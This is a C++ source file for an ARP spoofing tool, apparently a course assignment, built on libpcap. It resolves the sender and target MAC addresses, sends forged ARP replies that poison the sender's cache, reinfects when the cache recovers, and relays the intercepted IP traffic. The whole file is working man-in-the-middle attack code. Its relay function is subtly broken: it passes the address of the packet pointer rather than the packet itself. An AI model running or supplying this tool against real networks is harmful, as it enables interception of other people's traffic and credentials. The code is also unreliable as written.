#include "my-func.h"

Attacker attacker;

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void get_attacker_info(char* interface){
    // Reference: https://pencil1031.tistory.com/66
    uint8_t mac[6];
    char ip[40];

    int sock;
    struct ifreq ifr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0){
        fprintf(stderr, "Fail to get interface MAC address - socket() failed - %m\n");
        exit(-1);
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr)<0){
        fprintf(stderr, "Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sock);
        exit(-1);
    }

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    if (ioctl(sock, SIOCGIFADDR, &ifr)<0){
        fprintf(stderr, "Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sock);
        exit(-1);
    }

    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ip, sizeof(struct sockaddr));

    close(sock);

    attacker.mac = Mac(mac);
    attacker.ip = Ip(ip);
}

Mac get_smac(pcap_t* handle, Pair& pair){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = attacker.mac;

    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = attacker.mac;
    packet.arp_.sip_ = htonl(attacker.ip);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(pair.sip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(-1);
        }
        EthArpPacket* reply = (EthArpPacket*)packet;
        if (reply->eth_.type() != EthHdr::Arp) continue;
        if (reply->arp_.op() != ArpHdr::Reply) continue;
        if (reply->arp_.sip() != pair.sip) continue;

        return Mac(reply->arp_.smac());
    }
}

Mac get_tmac(pcap_t* handle, Pair& pair){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = attacker.mac;

    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = attacker.mac;
    packet.arp_.sip_ = htonl(attacker.ip);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(pair.tip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(-1);
        }
        EthArpPacket* reply = (EthArpPacket*)packet;
        if (reply->eth_.type() != EthHdr::Arp) continue;
        if (reply->arp_.op() != ArpHdr::Reply) continue;
        if (reply->arp_.sip() != pair.tip) continue;

        return Mac(reply->arp_.smac());
    }
}

void infect(pcap_t* handle, Pair& pair){
    EthArpPacket packet;

    packet.eth_.dmac_ = pair.smac;
    packet.eth_.smac_ = attacker.mac;

    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = attacker.mac;
    packet.arp_.sip_ = htonl(pair.tip);
    packet.arp_.tmac_ = pair.smac;
    packet.arp_.tip_ = htonl(pair.sip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }
}

bool is_spoofed_ip(const u_char* packet, Pair& pair){
    PEthHdr eth_hdr = (PEthHdr)packet;
    if (eth_hdr->type() != EthHdr::Ip4) return false;
    if (eth_hdr->smac() != pair.smac) return false;
    return true;
}

bool is_recover(const u_char* packet, Pair& pair){
    PEthHdr eth_hdr = (PEthHdr)packet;
    if (eth_hdr->type() != EthHdr::Arp) return false;

    PArpHdr arp_hdr = (PArpHdr)(packet + sizeof(EthHdr));

    if (arp_hdr->smac() != pair.smac) return false;
    if (arp_hdr->tip() != pair.tip) return false;
    return true;
}

void relay(pcap_t* handle, const u_char* packet, Pair& pair){
    PEthHdr eth_hdr = (PEthHdr)packet;
    eth_hdr->smac_ = attacker.mac;
    eth_hdr->dmac_ = pair.tmac;

    PIpHdr ip_hdr = (PIpHdr)(packet + sizeof(EthHdr));
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthHdr)+ip_hdr->tlen());
    if (res != 0){
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }
}

void arp_spoof(pcap_t* handle, Pair& pair){
    infect(handle, pair);
    printf("Sender infected!\n");

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(-1);
        }
        if (is_recover(packet, pair)){
            infect(handle, pair);
            printf("[DETECT] recover :: reinfect\n");
        } else if (is_spoofed_ip(packet, pair)) {
            relay(handle, packet, pair);
            printf("[DETECT] spoofed IP :: relay\n");
        }
    }
}

void task(pcap_t* handle, Pair& pair){
    pair.smac = get_smac(handle, pair);
    pair.tmac = get_tmac(handle, pair);

    printf("Sender MAC: %s\n", std::string(pair.smac).c_str());
    printf("Target MAC: %s\n", std::string(pair.tmac).c_str());
    arp_spoof(handle, pair);
}
